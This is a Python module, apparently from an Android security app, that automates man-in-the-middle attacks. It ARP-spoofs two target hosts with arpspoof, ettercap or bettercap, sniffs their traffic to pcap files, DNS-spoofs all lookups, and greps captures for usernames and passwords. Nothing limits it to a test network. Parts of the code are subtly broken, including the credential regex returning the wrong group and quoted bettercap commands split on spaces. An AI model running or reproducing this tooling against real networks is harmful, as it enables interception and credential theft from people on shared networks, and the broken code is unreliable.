"""
CyberLab Pro v3.0 — MITM Lab (Android/Chaquopy)
"""
import os
import re
import time
import shutil
import signal
import subprocess
import threading
from pathlib import Path
from core.utils import run_command, DATA_DIR, CAPTURE_DIR, LOG_DIR, CommandRunner

CAPTURE_DIR_MITM = f"{CAPTURE_DIR}/mitm"
Path(CAPTURE_DIR_MITM).mkdir(parents=True, exist_ok=True)


class MITMLab:
    def __init__(self):
        self._processes = {}
        self._active = False
        self._captures = []
        self._runner = CommandRunner()

    def _check_tool(self, name):
        local = os.path.join(os.environ.get("CYBERLAB_BASE_DIR", "/data/data/com.cyberlab/files/binaries"), name)
        if os.path.exists(local):
            return local
        system = shutil.which(name)
        return system if system else None

    def start_arp_spoof(self, target1: str, target2: str, interface: str = "wlan0", modules: dict = None) -> dict:
        self.stop_all()
        chain = ["arpspoof", "ettercap", "bettercap"]
        for tool in chain:
            tc = self._check_tool(tool)
            if not tc:
                continue
            if tool == "arpspoof":
                res = self._arpspoof(tc, target1, target2, interface)
            elif tool == "ettercap":
                res = self._ettercap(tc, target1, target2, interface)
            else:
                res = self._bettercap(tc, target1, target2, interface)
            if res.get("success"):
                res["tool_used"] = tool
                self._active = True
                if modules:
                    self._start_modules(modules, interface)
                return res
        return {"success": False, "error": "no_arp_tool"}

    def _arpspoof(self, path, t1, t2, iface):
        try:
            c1 = f"{path} -i {iface} -t {t1} {t2}"
            c2 = f"{path} -i {iface} -t {t2} {t1}"
            p1 = subprocess.Popen(c1.split(), stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            p2 = subprocess.Popen(c2.split(), stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            self._processes["arp"] = [p1, p2]
            time.sleep(1)
            ok = p1.poll() is None and p2.poll() is None
            return {"success": ok, "message": "ARP spoofing (arpspoof)"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _ettercap(self, path, t1, t2, iface):
        try:
            cmd = f"{path} -T -q -i {iface} -M arp:remote /{t1}// /{t2}//"
            proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self._processes["arp"] = proc
            time.sleep(2)
            return {"success": proc.poll() is None, "message": "ARP spoofing (ettercap)"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _bettercap(self, path, t1, t2, iface):
        try:
            cmd = f'{path} -iface {iface} -eval "set arp.spoof.targets {t1},{t2}; arp.spoof on; net.sniff on"'
            proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self._processes["arp"] = proc
            time.sleep(2)
            return {"success": proc.poll() is None, "message": "ARP spoofing (bettercap)"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _start_modules(self, modules, iface):
        if modules.get("http_sniff"):
            self.start_sniffing(interface=iface)
        if modules.get("dns_spoof"):
            self.start_dns_spoof(interface=iface)

    def start_sniffing(self, interface: str = "wlan0", output_file: str = None) -> dict:
        output_file = output_file or f"{CAPTURE_DIR_MITM}/capture_{int(time.time())}.pcap"
        for tool in ("tcpdump", "tshark", "ettercap"):
            tc = self._check_tool(tool)
            if not tc:
                continue
            try:
                if tool == "tcpdump":
                    cmd = f"{tc} -i {interface} -w {output_file}"
                elif tool == "tshark":
                    cmd = f"{tc} -i {interface} -w {output_file}"
                else:
                    cmd = f"{tc} -T -q -i {interface} -w {output_file}"
                proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self._processes["sniffer"] = proc
                return {"success": True, "tool": tool, "output_file": output_file}
            except Exception:
                continue
        return {"success": False, "error": "no_sniffer"}

    def stop_sniffing(self) -> dict:
        self._stop_process("sniffer")
        return {"success": True}

    def start_dns_spoof(self, host: str = "", redirect_ip: str = "127.0.0.1", interface: str = "wlan0") -> dict:
        bc = self._check_tool("bettercap")
        if not bc:
            return {"success": False, "error": "bettercap not found"}
        cmd = f'{bc} -iface {interface} -eval "set dns.spoof.all true; set dns.spoof.address {redirect_ip}; dns.spoof on"'
        try:
            proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self._processes["dns"] = proc
            return {"success": proc.poll() is None}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def harvest_credentials(self, pcap_file: str = None) -> list:
        if pcap_file and os.path.exists(pcap_file):
            res = run_command(f"{self._check_tool('tcpdump')} -r {pcap_file} -A 2>/dev/null | grep -E -i '(user|pass|login|auth)'", timeout=30)
            found = []
            for line in res.get("stdout", "").splitlines():
                m = re.search(r"(user(name)?|pass(word)?|login|auth)\s*[:=]\s*(\S+)", line, re.IGNORECASE)
                if m:
                    found.append({"type": m.group(1), "value": m.group(3), "source": pcap_file})
            return found
        return []

    def _stop_process(self, name):
        proc = self._processes.pop(name, None)
        if not proc:
            return
        if isinstance(proc, list):
            for p in proc:
                try:
                    if p.poll() is None:
                        p.terminate()
                        p.wait(timeout=3)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
            return
        try:
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    def stop_all(self):
        for name in list(self._processes.keys()):
            self._stop_process(name)
        self._active = False

    def get_status(self) -> dict:
        return {
            "active": self._active,
            "running": list(self._processes.keys()),
            "captures": len(self._captures),
        }
